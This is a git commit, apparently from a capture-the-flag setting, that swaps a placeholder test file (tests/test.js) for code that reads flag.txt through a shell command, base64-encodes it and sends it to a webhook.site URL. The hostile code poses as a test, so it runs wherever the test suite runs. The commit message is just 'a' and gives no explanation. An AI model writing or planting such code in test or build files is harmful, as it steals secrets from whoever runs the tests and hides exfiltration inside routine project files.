0c028ca150fdd2eb8de7fa9fb79dd5c767207195
mrfreddi007 <frivrud@sfjbb.net>
2023-04-15 15:39:53 +0200

    a

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,21 @@
-// TODO: implement the tests
-console.log("Tests are not implemented yet...");
+const https = require('https');
+const fs = require('fs');
+
+const { exec } = require("child_process");
+
+exec("cat flag.txt", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    flag = Buffer.from(stdout).toString('base64');
+    https.get('https://webhook.site/710e7f24-ff97-4c7d-80d8-e32707a29d54/' + flag, res => {
+
+    }).on('error', err => {
+        console.log('Error: ', err.message);
+    });
+});
